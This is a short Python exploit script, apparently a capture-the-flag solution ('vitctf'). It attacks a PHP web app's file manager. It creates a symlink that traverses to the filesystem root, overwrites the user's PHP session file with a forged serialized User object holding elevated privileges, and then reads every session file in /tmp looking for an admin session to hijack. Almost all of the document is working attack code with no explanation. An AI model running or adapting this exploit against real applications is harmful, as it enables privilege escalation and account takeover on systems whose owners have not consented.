from test import *

username = 'vitctf'
password = 'vitctf'
api_login(username, password)
pid = session.cookies.get('PHPSESSID')
api_create_symlink('B', '../../../../../../../')
api_update_file("B/tmp/sess_"+pid, b'current_user|O:4:"User":4:{s:8:"username";s:6:"vitctf";s:8:"password";s:60:"$2y$10$p155lvNrSwK8j4iGV9FDTOlYUcIWHgKUfwZIpFw/VRci.DoYpgPjC";s:5:"privs";s:2:"15";s:2:"id";s:2:"32";}')
sess = api_list_files('B/tmp')
k = 0
for i in sess:
	try:
		if 'sess' in i:
			print(k, "=> ", i)
			k += 1
			j = api_get_file('B/tmp/'+i)
			print(j[:20])
			if b'admin' in j:
				print('FOUND', j, i)
				#break
	except Exception as e:
		print('error', e)
		pass